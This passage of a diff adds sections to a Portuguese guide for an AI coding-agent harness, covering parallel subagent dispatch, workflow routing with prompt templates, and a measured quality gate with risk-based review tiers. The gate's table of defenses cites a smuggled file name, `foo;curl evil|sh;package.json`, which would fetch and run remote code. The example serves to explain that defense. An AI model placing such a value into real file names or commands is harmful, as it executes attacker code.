@@ -20,8 +20,12 @@
    9.1 [Feature Pequena — Quick Mode](#91-feature-pequena--adiciona-endpoint-get-apihealth)
    9.2 [Feature Grande — Pipeline Completo](#92-feature-grande--sistema-de-busca-com-filtros-e-ordenação)
    9.3 [Tabela Comparativa](#93-tabela-comparativa-pequena-vs-grande)
+   9.4 [Dispatch Paralelo — spec-lead Scheduler](#94-dispatch-paralelo--spec-lead-como-scheduler)
+   9.5 [Guia de Roteamento — Escolhendo o Fluxo PREVC](#95-guia-de-roteamento--escolhendo-o-fluxo-prevc)
 10. [Matriz de Completude](#10-matriz-de-completude)
 11. [Harness Global Productizado](#11-harness-global-productizado)
+12. [Gate Medido e Risk Router (v1.2)](#12-gate-medido-e-risk-router-v12)
+13. [Refine e Regras Aprendidas (v1.3)](#13-refine-e-regras-aprendidas-v13)
 
 ---
 
@@ -44,13 +48,21 @@ O harness organiza o projeto em 5 camadas. Cada camada resolve uma classe de pro
 │               sprint-contract.md            │
 ├─────────────────────────────────────────────┤
 │  FEEDBACK     init.ps1                      │  4. O agente consegue verificar
-│               zharnessengineering/index.md  │     se o projeto está saudável?
+│               quality-thresholds.json       │     se o projeto está saudável?
+│               harness-quality-gate.mjs      │     E com QUAL número?
+│               zharnessengineering/index.md  │
 ├─────────────────────────────────────────────┤
 │  EVALUATION   harness-judge.md              │  5. O agente consegue avaliar
 │               harness-evaluator-rubric      │     o próprio trabalho com
-│               harness-role-separation       │     critérios objetivos?
+│               harness-risk-router.mjs       │     critérios objetivos —
+│               harness-role-separation       │     e com que profundidade?
 └─────────────────────────────────────────────┘
 ```
+
+> **v1.2 (2026-08-10):** as camadas Feedback e Evaluation deixaram de ser binárias. Feedback ganhou
+> o **gate medido** (números, não só "o comando passou") e Evaluation ganhou o **risk router**
+> (profundidade de review computada, não só um veredito do Judge). Ver §12 e
+> `docs/harness/v1.2-context.md`.
 
 ### Por que 5 camadas?
 
@@ -59,8 +71,8 @@ O harness organiza o projeto em 5 camadas. Cada camada resolve uma classe de pro
 | Entry | Agente não sabe as regras do projeto | Redescobre setup a cada sessão |
 | Context | Agente não entende a arquitetura | Toma decisões inconsistentes |
 | State | Agente não sabe o progresso | Começa features pela metade, duplica trabalho |
-| Feedback | Agente não verifica baseline | Entrega código quebrado |
-| Evaluation | Agente se auto-avalia | Diz "pronto" sem evidência real |
+| Feedback | Agente não verifica baseline **com número** | Entrega código quebrado, ou "verde" sem medir nada |
+| Evaluation | Agente se auto-avalia | Diz "pronto" sem evidência real — ou inventa uma nota 0–10 |
 
 ---
 
@@ -340,6 +352,7 @@ Além dos skills, agora existem comandos globais em `~/.config/opencode/opencode
 | `/harness-spec` | Feature média/grande | Cria/propoe spec Agent OS em `agent-os/specs/YYYY-MM-DD-HHMM-slug/` |
 | `/harness-session-start` | Logo ao abrir uma sessão | Descobre instruções, progresso, task state e startup path; roda verificação descoberta e declara a task ativa |
 | `/prevc <feature ou prompt>` | Para executar uma feature | Executa PREVC global: discover → plan → review → execute → validate → judge → confirm → handoff |
+| `/quality [full]` | Antes de devolver uma lane, e antes do commit | Gate medido + risk router: tabela de métricas, tier de review, exit code. Ver §12 |
 | `/harness-clean-handoff` | Fim da sessão ou trabalho incompleto | Fecha estado usando artefatos disponíveis e startup path descoberto; depois mostra `git status` |
 
 ### Fluxo esperado de uso
@@ -946,6 +959,409 @@ harness-clean-handoff       → fecha após 6 features concluídas
 
 ---
 
+### 9.4 Dispatch Paralelo — spec-lead como Scheduler
+
+**Quando usar:** feature com **lanes independentes** (arquivos disjuntos, sem dependência sequencial). O spec-lead vira o scheduler da fase Execute do PREVC (opção B) e despacha as lanes em paralelo, cada uma num subagent com model próprio. Sem lanes independentes, use o fluxo normal (§9.1 / §9.2) — paralelismo não ajuda.
+
+**Setup (uma vez por sessão):**
+```powershell
+& "$env:USERPROFILE\.config\opencode\scripts\start-parallel.ps1"
+# seta OPENCODE_EXPERIMENTAL_BACKGROUND_SUBAGENTS=true + PARALLEL=true
+# abre: opencode --port 4096 --agent spec-lead
+```
+> Sem os env flags, o dispatch é **serial** — o script garante os dois.
+
+> ⚠️ **Cuidado com o stub de background (fix 2026-08-10).** Com esses flags,
+> `task(background:true)` retorna **na hora** um stub `<task state="running">Background task
+> started… you will be notified… DO NOT poll or duplicate…</task>`. Esse stub **não é o
+> resultado** (sem edits/evidência). O spec-lead foi endurecido pra **nunca** tratar o stub como
+> resultado nem rerotear/duplicar uma lane com `task_status` ainda `running` — só reconcilia em
+> estado terminal, lendo o relatório final do filho. Se o background falhar (o stub nunca vira o
+> resultado real), use **`start-serial.ps1`** (flags OFF): `task()` bloqueia e devolve o
+> relatório real — confiável, mas sem paralelismo. Modelos lentos (ex.: `deepseek-v4-flash max`,
+> ~4–5 min/lane) **agravam** a corrida por alargar a janela do stub.
+>
+> **Modelos (2026-08-12):** três agentes são pagos (`gpt-5.6-sol medium`): `spec-lead`, `refiner`
+> (o segundo pago, v1.3) e `rule-verifier` (o terceiro, D21); os outros 18 rodam
+> `opencode-go/deepseek-v4-flash` em `max` (effort válido nesse lane: `low/high/max`; `xhigh` não).
+> `code-reviewer` agora tem `bash: deny` — "reviewers nunca escrevem" era falso como configurado, e
+> v1.3 depende disso.
+
+**Auto mode (padrão para executar um plano nomeado):**
+```
+1. start-parallel.ps1                        → abre no spec-lead
+2. "Execute all tasks in plan <path> ..."    → a instrução AUTORIZA o run inteiro
+   → planeja as lane tables, executa tudo até o fim, para UMA vez no final
+3. (no fim) awaiting_confirmation             → tu revisa e confirma
+```
+> **Sem `/prevc run`, sem approval no meio.** Uma instrução pra executar um plano
+> nomeado de ponta a ponta é ela mesma a autorização do run autônomo. Roda do prompt
+> até o fim sozinho e para **uma vez só**, no `awaiting_confirmation` do spec inteiro.
+> Para no meio só por bloqueio real (task que exige operador/live, scope change,
+> push/deploy, ou falha de validação irrecuperável).
+
+**Modo manual (trabalho ad-hoc, não um plano nomeado):**
+```
+1. start-parallel.ps1   → abre no spec-lead
+2. pede o trabalho      → propõe o plano, para em awaiting_plan_approval
+3. "aprovado"           → sinaliza
+4. /prevc run           → autoriza o Execute
+```
+> `/prevc run` continua sendo o autorizador quando tu **não** deu uma instrução de
+> executar um plano inteiro. Pra plano nomeado (auto mode), não precisa.
+
+#### Receita pronta (copiar e colar)
+
+**1. Abrir a sessão** (no diretório do projeto):
+```powershell
+& "$env:USERPROFILE\.config\opencode\scripts\start-parallel.ps1"
+# segundo projeto ao mesmo tempo: adicione -Port 4097 -Dir "C:\outro\projeto"
+```
+
+**2. Passar o plano** — template reutilizável, troca só o caminho. A instrução já
+autoriza o run inteiro; ele roda até o fim e para uma vez no `awaiting_confirmation`:
+```text
+Execute all tasks in plan agent-os/specs/<PASTA-DO-PLANO> end to end under PREVC —
+this authorizes a full autonomous run.
+Propose a lane table per phase; parallelize independent lanes,
+serialize lanes sharing a file. Use recommended subagents.
+When all tasks land, run @code-reviewer and @architecture-reviewer in parallel
+over the diff; both must score 9+ with zero critical/blocking issues.
+Stop only at the final awaiting_confirmation for the whole spec.
+```
+
+**3. Confirmar no fim** — quando todo o plano terminou, ele para em
+`awaiting_confirmation` com os arquivos mudados e a evidência. Tu revisa e confirma.
+
+> **Plano com gates de operador/live** (máquina física, credencial, tráfego real):
+> o run autônomo **para sozinho** ao bater no primeiro gate de operador e reporta
+> `blocked`. Pra ser explícito, troca a 1ª linha por `Execute only the
+> agent-implementable tasks... and STOP at <Task N>`. Ex: OEM para na Task 5.
+> Plano sem gates (ex: Area Bindings) roda inteiro sem parar.
+>
+> Reviewer segundo o plano: usa o par que o `plan.md` do teu spec manda na task de
+> review final. Se o plano não diz, `code-reviewer` + `architecture-reviewer`.
+
+**Prompt do usuário:** `Adiciona página de comparação de props: card de UI, endpoint de agregação no backend, e testes dos dois.`
+
+**Classificação:** MEDIUM, 3 lanes disjuntas → **dispatch paralelo.**
+
+#### O que o usuário vê (por fora)
+
+```
+Usuário: Adiciona página de comparação de props: card de UI,
+         endpoint de agregação no backend, e testes dos dois.
+
+spec-lead (gpt-5.6-sol/high):
+  [PREPARE — role de planning]
+  Antes de despachar, mapeio ownership de arquivo por lane.
+  Despacho @explorer (read-only) pra confirmar convenções e call sites.
+
+  → @explorer (deepseek-flash/low): retorna file:line dos readers de
+    frontend_*.json e a convenção de erro em src/providers/
+
+  LANE TABLE (instrução de executar o plano = run autorizado):
+  ┌──────┬─────────────────────────┬──────────────────────────────┬──────────┬──────────────────────┐
+  │ Lane │ Objetivo                │ Ownership (arquivos)         │ Dep      │ Capability           │
+  ├──────┼─────────────────────────┼──────────────────────────────┼──────────┼──────────────────────┤
+  │ L1   │ Card de comparação      │ frontend-next/.../Compare.tsx│ —        │ vue-engineer/fixer   │
+  │ L2   │ Endpoint de agregação   │ src/analysis/compare.py      │ —        │ fixer                │
+  │ L3   │ Testes L1+L2            │ tests/test_compare.py        │ L1, L2   │ test-automation-eng  │
+  └──────┴─────────────────────────┴──────────────────────────────┴──────────┴──────────────────────┘
+  Risco: MEDIUM. Ownership disjunto entre L1 e L2 → paralelizam.
+  L3 depende de L1+L2 → roda depois. Verificação: npm run build; pytest.
+
+  [EXECUTE — role de scheduler, sem parar pra aprovação]
+  Despacho L1 e L2 em paralelo (task background: true), registro task IDs.
+
+  → task(fixer, L2)      → id=t_a1  [running]
+  → task(fixer, L1)      → id=t_b2  [running]
+
+  [poll task_status: t_a1 running, t_b2 running...]
+  [t_a1 → completed]  L2: compare.py criado, pytest do módulo passou
+  [t_b2 → completed]  L1: Compare.tsx criado, npm run build OK
+
+  L1+L2 terminais → despacho L3 (dep satisfeita).
+  → task(test-automation-engineer, L3)  → id=t_c3  [running]
+  [t_c3 → completed]  L3: test_compare.py, 8 passed 0 failed
+
+  RECONCILE + verificação cross-lane:
+  [npm run build → OK]  [pytest → 31 passed]  [.\init.ps1 → sai 0]
+
+  Devolvo o resultado reconciliado ao PREVC Validate.
+
+PREVC: Validate → Judge → awaiting_confirmation
+  Muda: 3 arquivos código. Evidência: build OK, pytest 31/0, init.ps1=0.
+
+Usuário: confirmo
+  → feature_list.json: feat-XXX → passing
+  → [harness-clean-handoff]
+```
+
+#### Regras que o scheduler obedece
+
+- **Um arquivo, uma lane write-capable por vez.** Lanes com ownership que se cruza **não** são independentes — serializa ou funde numa lane. (Ownership não é lock — é regra de prompt. Colisão = sobrescrita silenciosa.)
+- **Task ID registrado na hora.** Lane sem task ID = trabalho fora do radar, não existe.
+- **`task_status` é grosso:** só `running | completed | cancelled`, sem output parcial. Pra assistir um worker ao vivo, noutro pane: `opencode attach http://127.0.0.1:4096 --session <childId>`.
+- **Sem `ask` em background.** Subagents rodam com `permission` só `allow`/`deny` (config em `opencode.jsonc`); um `ask` penduraria a lane esperando aprovação que ninguém vê. Permission por agente **ganha** do global do plugin.
+- **Scope change volta pro PREVC.** O scheduler nunca absorve mudança de escopo no dispatch — para como `blocked`/`needs_input` e devolve pro operador.
+- **Nada de commit/push/deploy automático**, em nenhum nível de risco.
+
+#### Agentes disponíveis (roteados pelo spec-lead)
+
+Modelo e permissão de cada um são fixados em `opencode.jsonc`. Implementadores
+editam; reviewers e advisors são read-only.
+
+| Agente | Papel | Modelo / variant | edita? |
+|---|---|---|---|
+| `spec-lead` | Scheduler + planejamento | gpt-5.6-sol / medium (pago) | não |
+| `refiner` | Refine phase — lê a janela, propõe, nunca escreve | gpt-5.6-sol / medium (pago) | não |
+| `rule-verifier` | Refuta candidatos prose-`observe` (D21) | gpt-5.6-sol / medium (pago) | não |
+| `explorer` | Recon read-only | deepseek-v4-flash / max | não |
+| `fixer` | Lane escopada genérica | deepseek-v4-flash / max | sim |
+| `python-engineer` | FastAPI, SQLAlchemy, async, pytest | deepseek-v4-flash / max | sim |
+| `vue-engineer` | Vue 3, TS, Pinia, Vite/Nuxt | deepseek-v4-flash / max | sim |
+| `postgres-engineer` | Schema, migrations, locking, concorrência | deepseek-v4-flash / max | sim |
+| `kotlin-engineer` | Android, KMP, Compose | deepseek-v4-flash / max | sim |
+| `backend-infra-engineer` | Docker, CI, config, preflight, deploy | deepseek-v4-flash / max | sim |
+| `web-platform-engineer` | Cross-browser, build, Core Web Vitals | deepseek-v4-flash / max | sim |
+| `test-automation-engineer` | Testes + diagnóstico | deepseek-v4-flash / max | sim |
+| `code-reviewer` | Gate final: linha, segurança, qualidade | deepseek-v4-flash / max — **`bash: deny`** (review B5) | não |
+| `architecture-reviewer` | Gate final: estrutura, coupling, seams | deepseek-v4-flash / max | não |
+| `security-analyst` | Testing autorizado (wstg/redteam/recon) | deepseek-v4-flash / max | não |
+| `system-design-advisor` | Design de sistema (APIs, filas, escala) | deepseek-v4-flash / max | não |
+| `architecture-advisor` / `design-*` / `plan-architect` / `requirements-interrogator` | Advisory de planejamento | deepseek-v4-flash / max | não |
+
+**Gate final duplo:** ao terminar as tasks, o scheduler despacha `code-reviewer`
+e `architecture-reviewer` **em paralelo** sobre o diff. Ambos emitem nota `/10`.
+Ambos ≥9 com zero crítico/blocking → recomenda aprovação ao PREVC; **o operador
+confirma**. Os agentes **pontuam**, não aprovam — o carimbo final é teu. Para
+mudança system-level (serviço/fila/API novos), usa `system-design-advisor` como
+segundo gate no lugar do architecture-reviewer.
+
+#### Quando NÃO usar
+
+- Lanes que tocam o mesmo arquivo → serial (§9.2).
+- Feature de 1 arquivo → quick mode (§9.1). Overhead de scheduler não compensa.
+- Ctrl+C no spec-lead **não** mata os filhos em background — cancela via `cancel_task`/`task_status` ou fecha o pane do worker.
+
+#### Troubleshooting
+
+| Sintoma | Causa | Fix |
+|---|---|---|
+| spec-lead parou esperando aprovação | trabalho ad-hoc, não instrução de plano nomeado | `/prevc run`, ou reformula como "Execute all tasks in plan `<path>` end to end" |
+| 2º opencode não sobe | port 4096 ocupado | `-Port 4097` no script |
+| workers em série, não paralelo | abriu opencode cru, sem env flag | usa o `start-parallel.ps1` |
+| subagent "returned without edits/evidence" + reroteia/duplica em loop | scheduler leu o **stub** de background como resultado de uma lane ainda `running` | spec-lead já endurecido; se persistir, roda em serial com `start-serial.ps1` (task() bloqueia e devolve o resultado real) |
+| lane volta `blocked: file outside ownership` | scope change | volta pro plano, re-aprova |
+| tudo lento / erro de quota | lanes demais ou 2 schedulers | menos paralelo / 1 projeto por vez |
+| worker esperando pra sempre | permission `ask` num agente de background | troca pra `allow`/`deny` no jsonc |
+| Ctrl+C não parou os workers | filhos sobrevivem ao pai | `cancel_task` ou fecha o pane |
+
+---
+
+### 9.5 Guia de Roteamento — Escolhendo o Fluxo PREVC
+
+Antes de pedir qualquer trabalho, escolha o fluxo. A tabela abaixo roteia os nove casos típicos; as
+subseções seguintes dão o prompt pronto, o comportamento esperado de gate/aprovação e os erros
+comuns de cada um.
+
+**Vocabulário PREVC usado aqui:** tickets são **lanes** (cada lane é um ticket com ownership de
+arquivos); **run autônomo de plano nomeado** = a instrução *"Execute all tasks in plan
+`<caminho>` end to end"* autoriza o run inteiro; **um writer por arquivo** = um arquivo tem no
+máximo uma lane write-capable por vez; **review final duplo** = `code-reviewer` +
+`architecture-reviewer` em paralelo sobre o diff; **`awaiting_confirmation`** = a parada única do
+run; **sem approval por task** = nenhuma aprovação no meio do run.
+
+#### Tabela de roteamento
+
+| # | Caso | Classificação | Fluxo | Onde roda | Para em | Gate/approval esperado |
+|---|---|---|---|---|---|---|
+| 9.5.1 | Tarefa simples de um arquivo | SMALL | Quick mode (Specify → Execute → Verify) | sessão normal | fim, com evidência | sem lane table; operador vê diff + evidência |
+| 9.5.2 | Bug fix pequeno | SMALL + regressão | Quick mode + teste de regressão | sessão normal | fim, com evidência | regressão é blocking (v1.2); sem teste, gate falha |
+| 9.5.3 | Feature complexa | COMPLEX | Plano nomeado, pipeline completo | spec-lead | `awaiting_confirmation` | review final duplo; operador confirma uma vez |
+| 9.5.4 | Tasks independentes | MEDIUM/COMPLEX | Dispatch paralelo, lanes disjuntas | spec-lead + `start-parallel.ps1` | `awaiting_confirmation` | review final duplo; sem approval por task |
+| 9.5.5 | Tasks dependentes | COMPLEX | Dispatch serializado, blocking edges | spec-lead | `awaiting_confirmation` | review final duplo; dep só despacha com upstream terminal |
+| 9.5.6 | Trabalho multi-sessão | qualquer | WIP=1 + `harness-continuity` + handoff | sessões sucessivas | fim de cada sessão | clean handoff a cada sessão; retoma de STATE.md |
+| 9.5.7 | Mudança high-risk/security | ALTO RISCO | Risk router tier `full` | spec-lead | `awaiting_confirmation` | review full + `security-analyst` + humano lê |
+| 9.5.8 | Mudança docs-only | SMALL | Quick mode, só docs | sessão normal | fim, com evidência | `--check-sources`; nada de threshold em prosa |
+| 9.5.9 | Ciclo Refine/regra aprendida | v1.3 | Judge → `/refine` → `awaiting_confirmation` | spec-lead | `awaiting_confirmation` | texto literal renderizado; operador aprova regras blocking |
+
+---
+
+#### 9.5.1 Tarefa simples de um arquivo
+
+**Quando usar:** 1 arquivo de código, escopo óbvio, sem ambiguidade. Scheduler é overhead aqui.
+
+**Prompt (copiar e colar):**
+```text
+Adiciona <mudança> em <arquivo>. AC: <comando> passa. Fora de escopo: <o que NÃO fazer>.
+```
+
+**O que acontece:** quick mode direto na sessão — Specify → Execute → Verify. Evidência real
+(output do comando, não descrição). Sem lane table, sem dispatch, sem approval no meio. O operador
+revisa o diff e a evidência no final.
+
+**Erros comuns:** usar scheduler para 1 arquivo (overhead sem benefício); declarar "pronto" sem
+rodar o comando; tocar arquivos fora do escopo na mesma sessão (adjacente vira `not_started`).
+
+#### 9.5.2 Bug fix pequeno
+
+**Quando usar:** bug com causa localizada. Regressão é obrigatória — v1.2 nasce `blocking`: bug fix
+sem teste de regressão falha o gate.
+
+**Prompt (copiar e colar):**
+```text
+Corrige <bug> em <arquivo> (causa: <uma linha de diagnóstico>). Adiciona teste de regressão em
+<arquivo-de-teste>. AC: <comando de teste> passa e o teste novo falha sem a correção.
+```
+
+**O que acontece:** quick mode + teste que falha antes e passa depois. O gate local bloqueia se a
+mudança parece bug fix e nenhum arquivo de teste foi tocado. Evidência: output antes/depois.
+
+**Erros comuns:** corrigir sem reproduzir o bug primeiro; esquecer o teste de regressão (gate
+falha); "diagnosticar" por palpite em vez de rodar o comando que falha.
+
+#### 9.5.3 Feature complexa
+
+**Quando usar:** multi-componente, frontend + backend, ambiguidade, decisões de design. Usa plano
+nomeado (spec Agent OS em `agent-os/specs/<data-hora-slug>/`) e pipeline completo.
+
+**Prompt (copiar e colar):**
+```text
+Execute all tasks in plan agent-os/specs/<PASTA-DO-PLANO> end to end under PREVC — this authorizes
+a full autonomous run.
+Propose a lane table per phase; parallelize independent lanes, serialize lanes sharing a file.
+Use recommended subagents.
+When all tasks land, run @code-reviewer and @architecture-reviewer in parallel over the diff; both
+must score 9+ with zero critical/blocking issues.
+Stop only at the final awaiting_confirmation for the whole spec.
+```
+
+**O que acontece:** spec-lead planeja (lane table com ownership e dep), executa, roda o gate,
+review final duplo e para **uma vez** em `awaiting_confirmation` — nunca a cada task. O operador
+revisa diff + evidência e confirma. Plano com gate de operador/live: o run para sozinho no gate e
+reporta `blocked`.
+
+**Erros comuns:** aprovar no meio do run (não há o que aprovar — sem approval por task); misturar
+trabalho ad-hoc com plano nomeado (ad-hoc para em `awaiting_plan_approval` e exige `/prevc run`);
+plano sem AC mensurável por lane.
+
+#### 9.5.4 Tasks independentes — parallel lanes
+
+**Quando usar:** 2+ tickets com arquivos **disjuntos** (um writer por arquivo). Setup uma vez por
+sessão: `start-parallel.ps1` (flags de background ON).
+
+**Prompt:** o mesmo template do 9.5.3 — o scheduler paraleliza as lanes independentes sozinho.
+
+**O que acontece:** lanes independentes despacham em paralelo (`task(background:true)`), task IDs
+registrados na hora, scheduler reconcilia **só estados terminais** (nunca trata o stub de background
+como resultado), verificação cross-lane no fim, review final duplo, parada única em
+`awaiting_confirmation`.
+
+**Erros comuns:** paralelizar lanes que compartilham arquivo (sobrescrita silenciosa — ownership é
+regra de prompt, não lock); abrir opencode cru sem os flags (vira serial); scheduler reler o stub e
+rerotear lane ainda `running` (se persistir, serial com `start-serial.ps1`).
+
+#### 9.5.5 Tasks dependentes — serialized blocking edges
+
+**Quando usar:** tickets com dependência explícita (ex.: backend → frontend → testes).
+
+**Prompt:** o template do 9.5.3 com a coluna `Dep` preenchida na lane table:
+```text
+Lane table (Dep):
+  L1 backend endpoint      (dep: —)
+  L2 frontend consome      (dep: L1)
+  L3 testes E2E            (dep: L1, L2)
+```
+
+**O que acontece:** L1 roda; L2 só despacha quando L1 está **terminal** (completed/cancelled, com
+relatório real); L3 depois de L2. Nenhuma aprovação entre as ondas (sem approval por task). Para no
+`awaiting_confirmation` final. Se uma dep falha, o scheduler para como `blocked` e reporta — não
+"conserta" fora do escopo.
+
+**Erros comuns:** despachar lane dependente antes do upstream terminar; tratar upstream lento como
+`blocked` (é `running`, não `blocked`); absorver scope change no dispatch (devolve ao plano/operador).
+
+#### 9.5.6 Trabalho multi-sessão
+
+**Quando usar:** trabalho que não cabe numa sessão (longo, ou com gate de operador no meio).
+
+**Prompt:** nenhum especial — o harness força por estado: `harness-session-start` no início e
+`harness-clean-handoff` no fim de **cada** sessão.
+
+**O que acontece:** WIP=1 persiste em `feature_list.json`/STATE.md; `session-handoff.md` registra o
+que foi feito/quebrou/próximo passo; a próxima sessão retoma **só lendo os arquivos**. Se a sessão
+termina com trabalho incompleto, **ainda** faz handoff: lane → `blocked` com razão exata e Next
+Best Step.
+
+**Erros comuns:** terminar a sessão sem handoff ("vou lembrar amanhã"); não marcar a lane bloqueada
+com a causa; re-planejar do zero na sessão nova em vez de retomar do estado.
+
+#### 9.5.7 Mudança high-risk / security
+
+**Quando usar:** paths de risco (auth, pagamentos, senhas, migração de DB, YAML de infra,
+permissões) ou mudança system-level (serviço/fila/API novos). Risco **curto-circuita**: nenhum
+número verde compra atalho ali.
+
+**Prompt:** plano nomeado com nota de risco explícita:
+```text
+Execute all tasks in plan <PASTA-DO-PLANO> end to end — this authorizes a full autonomous run.
+This change touches <auth/...>: treat it as high risk; use tier full review.
+```
+
+**O que acontece:** risk router computa tier `full` → review completo + `security-analyst` + **o
+humano lê**. O gate falha fechado: report ausente, obsoleto ou exit 2 → tier `full`.
+`harness-ship-evidence` recusa emitir com gate vermelho ou obsoleto. Para em `awaiting_confirmation`;
+quem confirma é o operador.
+
+**Erros comuns:** achar que gate verde permite pular o review humano em path de risco; commitar sem
+o trailer do gate (ship-evidence recusa); pedir tier `auto` para mudança que mexe em
+permissão/auth.
+
+#### 9.5.8 Mudança documentation-only
+
+**Quando usar:** só docs (ex.: este guia). Nenhum código muda.
+
+**Prompt (copiar e colar):**
+```text
+Atualiza <doc> com <o que>. Preserva o conteúdo técnico existente; não altera thresholds nem
+contagens de teste; não afirma aceitação live que não aconteceu.
+```
+
+**O que acontece:** quick mode; verificação é o gate local + `--check-sources` (invariante 13:
+número governante pertence ao `quality-thresholds.json`, não à prosa — um limiar escrito em doc é
+achado do check-sources). Evidência: output real dos comandos. Docs que descrevem regras seguem a
+mesma disciplina do rulebook.
+
+**Erros comuns:** escrever limiar numérico em prosa (check-sources falha); editar
+`quality-thresholds.json` "só para documentar"; afirmar estado de aceitação que não aconteceu
+(ex.: live acceptance C1–C16).
+
+#### 9.5.9 Ciclo Refine / regra aprendida
+
+**Quando usar:** review aponta violação repetida de uma regra escrita; o operador quer que a
+próxima run injete a regra no dispatch da lane.
+
+**Fluxo:** gate → trailer (incl. `Adherence:`) → **CODE COMMIT** → Judge → `/refine` →
+`awaiting_confirmation` (proposta renderizada como texto literal) → operador confirma → **prosa em
+commit separado** do rulebook → próxima run injeta a regra.
+
+**O que acontece:** o `refiner` (read-only por permissão) lê a janela de findings e propõe **no
+máximo 1 proposta por componente por run**; não escreve nada e **não tem voto** no veredito. Regra
+blocking / high_risk_path: o operador aprova vendo o **texto literal**. Prose-`observe`: o
+`rule-verifier` (distinto, top-tier) pode refutar; a auto-activação está **desligada**
+(`auto_activate_prose_observe: false`) — opt-in por projeto, só depois de live acceptance (tabela
+C, C1–C16 — **não rodada**) e restart do OpenCode. `/refine --note` registra correção manual do
+operador com peso próprio.
+
+**Erros comuns:** escrever prosa de regra junto com o commit de código (estala o `sourceHash` e o
+ship-evidence recusa — a ordem prosa-depois-do-commit é estrutural); tratar proposta renderizada
+como aprovada (renderização é o prompt de confirmação, não a aprovação); rodar o refiner no tier
+mais barato; afirmar que live acceptance rodou ou que a auto-activação está ligada.
+
+---
+
 ## 10. Matriz de Completude
 
 ### Estado atual do projeto Hardware Pulse
@@ -979,6 +1395,199 @@ harness-clean-handoff       → fecha após 6 features concluídas
 | 9 | `harness-evaluator-rubric` | 33 |
 | 10 | `harness-role-separation` | 41 |
 | 11 | `harness-context-layer` | global — audita ARCHITECTURE.md, PRODUCT.md, RELIABILITY.md |
+
+---
+
+## 12. Gate Medido e Risk Router (v1.2)
+
+Antes de v1.2 a barra de aprovação do harness eram **duas notas 0–10 inventadas por um modelo** —
+`code-reviewer` e `architecture-reviewer` em paralelo, nenhum recebendo número medido, os dois no
+modelo mais barato da matriz. Tudo abaixo disso (Judge, commit, handoff) herdava um palpite.
+
+v1.2 não adiciona uma camada ao lado: troca **a entrada** desses gates.
+
+### `/quality` — uma linha de comando, dois números
+
+```bash
+/quality              # --mode local: coverage, complexidade, tamanho de módulo, security, boundaries, regressão
+/quality full         # + mutação e e2e — só o scheduler, uma vez, antes do commit único
+```
+
+Sai uma tabela e um exit code: `0` passou/observando · `1` métrica bloqueante vermelha · `2` **o
+gate quebrou** (blocker de harness, nunca "o código falhou").
+
+Thresholds ficam em `agent-os/quality-thresholds.json`, por projeto. Afrouxar exige linha datada em
+`quality-decisions.md` — o gate compara contra o merge-base e recusa afrouxamento silencioso.
+
+### Os quatro tipos de teste
+
+Coverage prova que a linha rodou. **Mutação prova que o teste asserta.** Regressão prova que um bug
+corrigido continua corrigido. E2E prova que o sistema montado funciona. Coverage é piso; mutação é o
+alvo, em ratchet. Regressão é a única métrica que já nasce `blocking`: **bug fix sem teste de
+regressão falha o gate.**
+
+### Profundidade de review por risco
+
+| Tier | Quando | Profundidade |
+|---|---|---|
+| `auto` | risco baixo · complexidade baixa · gate verde | ninguém lê o diff. Gate é a evidência; operador confirma |
+| `sampling` | complexidade média · gate verde | lê só os N hunks mais arriscados, e **diz** "revisei 3 de 11" |
+| `full` | path de risco, complexidade alta, ou gate vermelho | review completo + `security-analyst` + humano lê |
+
+Risco vem de **paths** (auth, pagamentos, senhas, migração de DB, YAML de infra, permissões) e
+curto-circuita: nenhum número verde compra atalho ali. Complexidade é pontuada por fatos do diff.
+`untrusted` nunca é computado — é procedência, declarada pelo operador.
+
+**O gate falha fechado.** Report ausente, obsoleto, `unconfigured` ou exit 2 → tier `full`. Gate
+quebrado nunca pode comprar *menos* review do que v1.1 dava.
+
+### Evidência que viaja
+
+O commit ganha trailer (`Quality-Gate:` / `Metrics:` / `Risk-Tier:` / `Gate-Report:`) — então
+`git log --grep=Quality-Gate` é o histórico de qualidade do projeto de graça. O corpo do PR ganha a
+tabela, o tier e o checklist de pontos cegos. `harness-ship-evidence` **se recusa a emitir** com gate
+vermelho ou obsoleto: é aí que "commit aprovado só com gate decente" fica estrutural. Push, merge e
+git remoto seguem manuais.
+
+### Rollout em 3 fases
+
+**A — observe:** tudo reporta, nada bloqueia (exceto regressão). Coleta baseline real.
+**B — bloqueia o tier fácil:** thresholds vindos dos baselines da fase A, métricas locais em
+`blocking`, tier `auto` habilitado.
+**C — gate completo:** mutação em ratchet, write-back e propostas de aperto ligadas.
+
+Não pule a fase A. Threshold aspiracional definido antes de medir é o caminho mais rápido para um
+gate que todo mundo desativa.
+
+### O que o gate NÃO vê
+
+Correção de lógica de negócio, se a feature **certa** foi construída, race conditions, loops sem
+limite que não têm cara de N+1, memory leak, lógica de autorização, encaixe idiomático, direção
+arquitetural. Essa lista mora em `docs/review.md` de cada projeto e cresce com o que escapou. É onde
+a atenção liberada pelo gate deve cair — o argumento nunca foi "pare de pensar no código".
+
+### O gate verifica os próprios artefatos
+
+Essa foi a lição mais cara da construção, e vale saber antes de estender o sistema. Cinco rodadas de
+review acharam **a mesma direção de erro cinco vezes**: a verificação fechada numa camada e aberta na
+de baixo. Report verificado → o guard que lê o report não → a fonte do guard não → a referência da
+fonte não → chave nova de config não.
+
+O que ficou, e por quê:
+
+| Defesa | O que ela impede |
+|---|---|
+| Git por argv, `shell:false`, `-z`, `--` antes de path | um arquivo chamado `foo;curl evil\|sh;package.json` executando código |
+| `assessReport`: hash presente **e** casando, `rows` não-vazio, cobertura de métrica | um JSON de cinco campos lendo como gate verde |
+| Fingerprint da config **inteira** (+ bucket para chave desconhecida) | `suites.regression.command → exit 0` desligando a única métrica bloqueante |
+| Config dentro do `sourceHash`, em forma canônica sem `baseline` | remover `**/auth/**` depois de um gate verde e perder a revisão obrigatória |
+| Barra anterior = a **mais estrita** entre HEAD commitado e reports | baseline afrouxado à mão, e forja do report *anterior* (mais barata que a do atual) |
+| `resolveInsideRoot` no `--review` | arquivo fora do repo satisfazendo o tier `full` |
+| `reviewApproves` | um review dizendo REQUEST CHANGES satisfazendo o tier `full` |
+
+**Limites declarados, não fechados:** o `sourceHash` prova frescor, não autoria — quem tem escrita na
+árvore e roda o gate produz report com hash correto. E o guard é relativo ao HEAD, então branch órfã
+ou raiz reescrita escapa. O gate defende contra **descuido** e **erosão silenciosa**, que é o problema
+real, não contra um atacante com commit.
+
+Vereditos finais do próprio gate duplo sobre esta mudança: `code-reviewer` **9/10**,
+`architecture-reviewer` **9/10**, `security-analyst` **CLEAR** — depois de 54 achados aceitos.
+
+Detalhes, matriz de ferramentas por stack e as invariantes 7–15: `docs/harness/measured-gates.md` e
